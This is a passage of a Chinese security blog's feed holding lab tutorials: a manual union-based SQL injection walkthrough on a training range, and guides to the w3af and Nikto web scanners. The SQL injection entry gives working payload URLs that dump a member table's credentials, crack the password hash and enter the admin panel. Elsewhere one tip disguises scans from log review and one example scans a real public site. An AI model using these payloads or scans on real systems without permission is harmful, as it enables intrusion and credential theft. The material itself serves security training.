        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;态度决定高度!&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; ma
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="手工挖掘漏洞" scheme="https://louisnie.github.io/tags/%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院--手工注入mysql数据库实例</title>
    <link href="https://louisnie.github.io/2018/10/23/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E4%BE%8B/"/>
    <id>https://louisnie.github.io/2018/10/23/墨者学院-手工注入mysql数据库实例/</id>
    <published>2018-10-23T15:37:27.000Z</published>
    <updated>2018-10-23T15:56:36.143Z</updated>
    
    <content type="html"><![CDATA[<h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><p>﻿开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息.<br><img src="1.png" alt=""><br><img src="2.png" alt=""></p><h2 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h2><p>我们可以试试1=1和1=2大法,输入在参数id=1后面加入1=1进行逻辑判断<br><img src="3.png" alt=""><br>显示正常,然后换1=2,因为1=2为一个假命题,如果能插入到数据库进行逻辑判断,那么由于该语句错误,数据库查询不到任何信息,界面就不会显示任何信息<br><img src="4.png" alt=""><br>根据这种情况可以大概的判断出该网站很大可能存在SQL注入漏洞.<br>我们可以大概的猜测出该web页面中背后的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  column1,column2..... from table  where id=$_GET[&quot;id&quot;]</span><br></pre></td></tr></table></figure><p>然后通过order by判断出该SQL语句查询有多少列(或者说查询多少个字段),<br>order by用于对筛选出来的结果按照列(关键字)进行排序,对于多列的时候，先按照第一个column name排序，如果第一个column name相同,则按照第二个column name排序,我们输入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42182/new_list.php?id=1 order by 1,2,3,4,5</span><br><span class="line">#假设该SQL语句中查询了5个关键字,如果没报错,那么表示所查询的关键字大于或者等于5,如果报错表示查询的小于5</span><br></pre></td></tr></table></figure><p><img src="5.png" alt=""><br>出现报错,表示所选择的关键字小于5,我们换成3,可以正确显示其界面,换成4也可以正常显示,所以可以得出所选择的关键字个数为4.<br>那么其SQL语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column1,column2,column3,column4 from table where id=$_GET(&quot;id&quot;)</span><br></pre></td></tr></table></figure><p>接下来判断在页面中可以显示的关键字<br><img src="6.png" alt=""><br>其SQL语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column1,column2,column3,column4 from table where id=5 union select 1,2,3,4</span><br></pre></td></tr></table></figure><p>注:由上面的操作得出该SQL语句查询4个关键字,我们将id=5,则对于第一个SQL语句由于不满足where条件而不显示其内容,所以执行第二条语句,select 1,2,3,4就是判断在页面中显示的是哪些关键字.<img src="7.png" alt="">)<br>由这个信息可以得出显示的是第二个和第三个字段的内容</p><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><p>我们将第二个和第三个字段换成MySQL数据库中的函数,即可获取其数据库的信息<br>使用user()函数可以得知当前数据库的使用者<br>使用database()函数可以得知当时数据库的名称<br><img src="8.png" alt="">)<br>该MYSQL数据库名叫mozhe_Discuz_StormGroup,当前使用者为root<br>在MYSQL数据库中有一个数据库叫information_schema数据库,它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。可以简单的理解为数据词典或者系统目录.</p><p><img src="9.png" alt="">)<br>其命令为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42182/new_list.php</span><br><span class="line">?id= 5 union select 1, schema_name ,3,4 from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure><p>注:limit 0,1表示从第0行起,取第一行数据,第一行为information_schema,举个例子:<br><img src="10.png" alt="">)<br>limit 0,1即就是指dvwa数据库<br>limit1,1即就是information_schema数据库<br>回到原来的注入问题,我们将limit 0,1换成limit 1,1   limit 2,2  limit 3,3  limit 4,4 information_schema,mozhe_Discuz_StormGroup,mysql,performance_schema,sys这五个数据库,当输入limit5,5页面没有内容表示目前拥有五个数据库.<br>然后枚举数据库中的数据表<br>注入的URL为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43635/new_list.php?id=5  union select 1,table_name,3,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>获得mozhe_Discuz_StormGroup数据库的第一张表为StormGroup_member<br><img src="11.png" alt="">)<br>将0,1替换为1,1所得到的数据表为notice,替换成2,2则没有显示任何数据表示该数据库只有两张表.<br>所以得到数据库mozhe_Discuz_StormGroup中有两张表为StormGroup_member和notice表,那么我们查其列.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43635/new_list.php?id=5  union select 1,column_name,3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos; limit 0,1</span><br></pre></td></tr></table></figure></p><p><img src="12.png" alt=""><br>得到在其StormGroup_member表下有个列为id,我们将0,1替换成1,1   2,2    3,3   得到的列分别是name,password,status<br>那么可以得知在mozhe_Discuz_StormGroup数据库的StormGroup_member表下有四列分别是id,name,password,status</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43635/new_list.php</span><br><span class="line">?id=5  union select 1,name,3,4 from  StormGroup_member  limit 0,1</span><br></pre></td></tr></table></figure><p><img src="13.png" alt="">)<br>查找其密码列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43635/new_list.php?id=5  union select 1,password,3,4 from  StormGroup_member  limit 0,1</span><br></pre></td></tr></table></figure><p><img src="14.png" alt="">)<br>将此密码进行MD5解密可得明文密码<br><img src="15.png" alt="">)<br>然后我们就可以进入后台管理系统啦<br><img src="16.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;发现漏洞&quot;&gt;&lt;a href=&quot;#发现漏洞&quot; class=&quot;headerlink&quot; title=&quot;发现漏洞&quot;&gt;&lt;/a&gt;发现漏洞&lt;/h2&gt;&lt;p&gt;﻿开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息.&lt;
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="手工挖掘漏洞" scheme="https://louisnie.github.io/tags/%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>w3af--命令行模式实验简述</title>
    <link href="https://louisnie.github.io/2018/10/23/w3af-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%AE%9E%E9%AA%8C%E7%AE%80%E8%BF%B0/"/>
    <id>https://louisnie.github.io/2018/10/23/w3af-命令行模式实验简述/</id>
    <published>2018-10-23T15:31:30.000Z</published>
    <updated>2018-10-23T16:14:09.844Z</updated>
    
    <content type="html"><![CDATA[<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="﻿实验环境:"></a>﻿实验环境:</h2><p>Kali:192.168.128.128<br>Metasploitable:192.168.128.129</p><h2 id="安装W3af-简介及安装w3af文档"><a href="#安装W3af-简介及安装w3af文档" class="headerlink" title="安装W3af:简介及安装w3af文档"></a>安装W3af:<a href="https://blog.csdn.net/qq_39353923/article/details/82557316" target="_blank" rel="noopener">简介及安装w3af文档</a></h2><h2 id="w3af用户接口"><a href="#w3af用户接口" class="headerlink" title="w3af用户接口:"></a>w3af用户接口:</h2><ol><li>​    console命令行接口</li><li>​    Gui图形界面化接口</li><li>​    API接口</li></ol><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/w3af-master# ./w3af_console </span><br><span class="line">w3af&gt;&gt;&gt; </span><br><span class="line">w3af&gt;&gt;&gt; help   #help命令列出当前命令提示符下的可用指令</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| start         | Start the scan.  开始扫描                                                 |</span><br><span class="line">| plugins       | Enable and configure plugins.   选择和配置插件                                 |</span><br><span class="line">| exploit       | Exploit the vulnerability. 使用该模块进行攻击漏洞                                       |</span><br><span class="line">| profiles      | List and use scan profiles. 列出可以用来扫描的文件                                      |</span><br><span class="line">| cleanup       | Cleanup before starting a new scan.  在开始新扫描之前进行清理                             |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| help          | Display help. Issuing: help [command] , prints more specific help |</span><br><span class="line">|               | about &quot;command&quot;                                                   |</span><br><span class="line">| version       | Show w3af version information.    显示w3af版本信息                                |</span><br><span class="line">| keys          | Display key shortcuts.  显示关键快捷方式。                                          |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| http-settings | Configure the HTTP settings of the framework.      配置框架的HTTP设置。               |</span><br><span class="line">| misc-settings | Configure w3af misc settings.  配置w3af misc设置                                   |</span><br><span class="line">| target        | Configure the target URL.  配置目标URL                                       |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back          | Go to the previous menu.    返回前一目录                                      |</span><br><span class="line">| exit          | Exit w3af.           退出                                             |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| kb            | Browse the vulnerabilities stored in the Knowledge Base     浏览存储在知识库中的漏洞      |</span><br><span class="line">|-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">w3af&gt;&gt;&gt; plugins  #输入plugins,进入插件目录的内,</span><br><span class="line">w3af/plugins&gt;&gt;&gt; help #输入help显示当前可使用的命令</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| list              | List available plugins.                                       |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back              | Go to the previous menu.                                      |</span><br><span class="line">| exit              | Exit w3af.                                                    |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| output            | View, configure and enable output plugins                     |</span><br><span class="line">| grep              | View, configure and enable grep plugins                       |</span><br><span class="line">| evasion           | View, configure and enable evasion plugins                    |</span><br><span class="line">| audit             | View, configure and enable audit plugins                      |</span><br><span class="line">| infrastructure    | View, configure and enable infrastructure plugins             |</span><br><span class="line">| crawl             | View, configure and enable crawl plugins                      |</span><br><span class="line">| auth              | View, configure and enable auth plugins                       |</span><br><span class="line">| mangle            | View, configure and enable mangle plugins                     |</span><br><span class="line">| bruteforce        | View, configure and enable bruteforce plugins                 |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; list audit 或者audit #列出audit插件类中的小插件</span><br></pre></td></tr></table></figure><p>也可以在图形界面化直观的看清其结构</p><p><img src="1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个</span><br><span class="line">#那么再次列出时这些插件的Status将会变成Enabled,如果进行扫描,那么就会针对这些漏洞去扫描</span><br><span class="line">w3af/plugins&gt;&gt;&gt; audit xss sqli lfi </span><br><span class="line"></span><br><span class="line">#使用audit模块中的所有插件进行扫描</span><br><span class="line">w3af/plugins&gt;&gt;&gt; audit all</span><br><span class="line"></span><br><span class="line">#输入crawl模块,按两次tab键,可以显示该模块下的插件</span><br><span class="line">w3af/plugins&gt;&gt;&gt; crawl </span><br><span class="line">genexus_xml wordpress_fingerprint dot_listing content_negotiation robots_txt archive_dot_org ria_enumerator wordnet user_dir sitemap_xml bing_spider dir_file_bruter phpinfo find_dvcs import_results urllist_txt google_spider url_fuzzer find_backdoors web_spider spider_man find_captchas oracle_discovery wsdl_finder wordpress_enumerate_users web_diff dwsync_xml pykto wordpress_fullpathdisclosure phishtank digit_sum open_api dot_ds_store ghdb all config desc </span><br><span class="line">w3af/plugins&gt;&gt;&gt; crawl web_spider  #选择该模块下的web爬虫模块</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">w3af&gt;&gt;&gt; profiles  #进入profiles模块,这个模块用于自定义组合插件,当然w3af自定义了一些组合插件</span><br><span class="line">w3af/profiles&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| use        | Use a profile.                                                       |</span><br><span class="line">| list       | List available profiles.                                             |</span><br><span class="line">| save_as    | Save the current configuration to a profile.                         |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back       | Go to the previous menu.                                             |</span><br><span class="line">| exit       | Exit w3af.                                                           |</span><br><span class="line">|------------------------------------------------------------------------------</span><br><span class="line">w3af/profiles&gt;&gt;&gt; list  #列出在profiles模块下的插件</span><br><span class="line"></span><br><span class="line">w3af/profiles&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| use        | Use a profile.                                                       |</span><br><span class="line">| list       | List available profiles.                                             |</span><br><span class="line">| save_as    | Save the current configuration to a profile. #保存当前配置到一个文件内                        |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back       | Go to the previous menu.                                             |</span><br><span class="line">| exit       | Exit w3af.                                                           |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3af/profiles&gt;&gt;&gt; save_as test   #使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内</span><br><span class="line">Profile saved.</span><br><span class="line"></span><br><span class="line">#使用下列命令将test文件独立出来,以便供其他人使用</span><br><span class="line">w3af/profiles&gt;&gt;&gt; save_as test self-contained</span><br><span class="line"></span><br><span class="line">w3af/profiles&gt;&gt;&gt; use test      #使用自定义的test文件中的配置进行扫描</span><br><span class="line">The plugins configured by the scan profile have been enabled, and their options configured.</span><br><span class="line">Please set the target URL(s) and start the scan.</span><br><span class="line"></span><br><span class="line">w3af/profiles&gt;&gt;&gt; back #返回上一级</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3af&gt;&gt;&gt; http-settings  #进入http-settings,设置全局参数</span><br><span class="line">w3af/config:http-settings&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| view   | List the available options and their values.                             |</span><br><span class="line">| set    | Set a parameter value.          #设置参数值                                         |</span><br><span class="line">| save   | Save the configured settings.          #保存配置                                  |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back   | Go to the previous menu.       #返回上一目录                                          |</span><br><span class="line">| exit   | Exit w3af.                                                               |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">w3af/config:http-settings&gt;&gt;&gt; view  #列出可用的操作和其值</span><br><span class="line">|---------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">#设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现</span><br><span class="line">w3af/config:http-settings&gt;&gt;&gt; set rand_user_agent True </span><br><span class="line"></span><br><span class="line">w3af/config:http-settings&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af&gt;&gt;&gt; misc-settings  #进入misc-setting全局设置选项中</span><br><span class="line">w3af/config:misc-settings&gt;&gt;&gt; view  #查看需要配置的参数</span><br><span class="line">w3af/config:misc-settings&gt;&gt;&gt; set fuzz_url_filenames True  #设置对URL中的文件名进行模糊测试(Fuzz)</span><br><span class="line"></span><br><span class="line">w3af/config:misc-settings&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af&gt;&gt;&gt; target  #进入target模块,设置目标信息</span><br><span class="line">w3af/config:target&gt;&gt;&gt; help  #查看在此模块下可以使用的命令</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| view   | List the available options and their values.                             |</span><br><span class="line">| set    | Set a parameter value.                                                   |</span><br><span class="line">| save   | Save the configured settings.                                            |</span><br><span class="line">|-----------------------------------------------------------------------------------|</span><br><span class="line">| back   | Go to the previous menu.                                                 |</span><br><span class="line">| exit   | Exit w3af.                                                               |</span><br><span class="line">|-----------------------------------------------------------------------------</span><br><span class="line">w3af/config:target&gt;&gt;&gt; view  #列出可用的操作</span><br><span class="line">|----------------------------------------------------------------------------------|</span><br><span class="line">| Setting        | Value | Modified | Description                                      |</span><br><span class="line">|----------------------------------------------------------------------------------|</span><br><span class="line">| target_framework | unknown |       | Target programming framework                     |</span><br><span class="line">|                |      |       | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) |</span><br><span class="line">| target         |      |       | A comma separated list of URLs                   |</span><br><span class="line">| target_os      | unknown |       | Target operating system (unknown/unix/windows)   |</span><br><span class="line">|-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">#设置目标URL</span><br><span class="line">w3af/config:target&gt;&gt;&gt; set target http://192.168.128.129</span><br><span class="line">w3af/config:target&gt;&gt;&gt; set target_os unix #设置目标系统为unix</span><br><span class="line">w3af/config:target&gt;&gt;&gt; back  #返回上一级目录</span><br><span class="line">w3af&gt;&gt;&gt;start      #开始扫描</span><br></pre></td></tr></table></figure><p>也可以使用w3af中集成的脚本去进行扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/w3af-master# cd scripts/</span><br><span class="line">root@kali:~/w3af-master/scripts# ls</span><br><span class="line">allowed_methods.w3af             login_brute_form_GET.w3af</span><br><span class="line">all.w3af                         login_brute_password_only.w3af</span><br><span class="line">auth_detailed.w3af               mangle_request.w3af</span><br><span class="line">bing_spider.w3af                 mangle_response.w3af</span><br><span class="line">blind_sqli_detection.w3af        os_commanding-lnx-vdaemon.w3af</span><br><span class="line">cookie_fuzzing.w3af              os_commanding-lnx-w3afAgent.w3af</span><br><span class="line">cross_domain.w3af                os_commanding_shell.w3af</span><br><span class="line">csrf.w3af                        os_commanding.w3af</span><br><span class="line">dav_shell.w3af                   php_sca-payload.w3af</span><br><span class="line">detect_transparent_proxy.w3af    profile-fast_scan.w3af</span><br><span class="line">digit_sum.w3af                   remote_file_include_local_ws.w3af</span><br><span class="line">dvwa.w3af                        remote_file_include_proxy.w3af</span><br><span class="line">eval_shell.w3af                  remote_file_include_shell.w3af</span><br><span class="line">eval.w3af                        remote_file_include_shell-xss.w3af</span><br><span class="line">exploit_all.w3af                 remote_file_include_w3af_site.w3af</span><br><span class="line">exploit_fast.w3af                spider_man.w3af</span><br><span class="line">filename_xss.w3af                sqli.w3af</span><br><span class="line">file_upload_shell.w3af           sqlmap_exploit_int.w3af</span><br><span class="line">frontpage_version.w3af           targets_from_file.w3af</span><br><span class="line">header_fuzzing.w3af              web_spider-ignore_regex.w3af</span><br><span class="line">html_output.w3af                 web_spider-only_forward.w3af</span><br><span class="line">list_all_plugins.w3af            web_spider.w3af</span><br><span class="line">local_file_include-payload.w3af  xss_simple.w3af</span><br><span class="line">local_file_include.w3af          xss_stored.w3af</span><br><span class="line"></span><br><span class="line">#参数-s表示指定具体的脚本去进行扫描,但需要首先去进入该脚本进行配置目标信息,然后调用w3af的console接口去扫描是否存在sql注入</span><br><span class="line">root@kali:~/w3af-master# ./w3af_console -s scripts/sqli.w3af</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outcha
      
    
    </summary>
    
      <category term="kali" scheme="https://louisnie.github.io/categories/kali/"/>
    
    
      <category term="tools" scheme="https://louisnie.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>WEB扫描工具之Nikto实践</title>
    <link href="https://louisnie.github.io/2018/10/23/WEB%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNikto%E5%AE%9E%E8%B7%B5-1/"/>
    <id>https://louisnie.github.io/2018/10/23/WEB扫描工具之Nikto实践-1/</id>
    <published>2018-10-23T15:28:27.000Z</published>
    <updated>2018-10-23T15:30:54.985Z</updated>
    
    <content type="html"><![CDATA[<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境:"></a>实验环境:</h2><p>kali:192.168.136.128/24<br>                Metasploitable:192.168.136.129/24 </p><h2 id="Nikto简介"><a href="#Nikto简介" class="headerlink" title="Nikto简介"></a><strong>Nikto简介</strong></h2><p>Web扫描工具大部分都支持两种扫描模式:代理截断模式和主动扫描模式<br>Nikto:是一个Web服务器扫描程序，主要是去检查软件版本信息,搜索存在的安全隐患的文件,服务器配置漏洞,Web Application层面的安全隐患等,也能避免404误判（原因：很多服务器不遵循RFC标准，对于不存在的对象返回200响应码）；依据响应文件内容判断，不同扩展名的文件404响应内容不同；去时间信息后的内容取MD5值；不建议用-no404参数（-no404参数指去不校验404误判,它还可以捕获并打印收到的任何cookie.</p><p>Wiki百科对其功能的介绍</p><blockquote><p>Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.<br>Nikto是一个开源（GPL）Web服务器扫描程序，可针对多个项目对Web服务器执行全面测试，包括超过6700个潜在危险文件/ CGI，检查超过1250台服务器的过期版本，以及超过270台服务器上的版本特定问题。它还会检查服务器配置项，例如是否存在多个索引文件，HTTP服务器选项，并将尝试识别已安装的Web服务器和软件。扫描项目和插件经常更新，可以自动更新。</p></blockquote><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nikto -update   #从CIRT.net网站更新nikto的数据库和插件</span><br><span class="line"></span><br><span class="line">root@kali:~# nikto -list-plugins  #列出nikto内列出所有可用的插件</span><br><span class="line"></span><br><span class="line">#扫描目标主机的Web层面的漏洞,格式为:nikto -host 目标服务器URL(可以是多个URL)</span><br><span class="line">root@kali:~#  nikto -host http://192.168.136.129 </span><br><span class="line"></span><br><span class="line">#也可以使用nikto -host 目标IP地址 -port 扫描端口,和上一条命令效果一致</span><br><span class="line">root@kali:~# nikto -host 192.168.136.129 -port 80,443 </span><br><span class="line"></span><br><span class="line">#使用ssl模式去扫描目标系统的信息</span><br><span class="line">root@kali:~# nikto -host www.baidu.com -port 